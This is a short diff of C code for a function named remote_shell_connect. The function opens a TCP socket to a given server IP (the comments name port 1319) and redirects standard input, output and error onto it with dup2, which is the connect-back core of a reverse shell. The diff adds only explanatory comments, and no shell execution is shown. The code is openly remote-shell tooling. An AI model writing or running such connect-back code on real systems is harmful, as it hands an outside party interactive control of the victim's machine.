@@ -1,5 +1,8 @@
 
+// start client side code 
+// parameter is server ip and prot is 1319
 int remote_shell_connect(char * dest_ip){
+    
     int fd = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_socket;
@@ -11,7 +14,7 @@ int remote_shell_connect(char * dest_ip){
     ret = connect(fd, (struct sockaddr *)&server_socket, sizeof(struct sockaddr));
     assert(ret!=-1);
     
-    // Redirect IO
+    // Redirect IO to socket fd
     dup2(fd, 0);
     dup2(fd, 1);
     dup2(fd, 2);
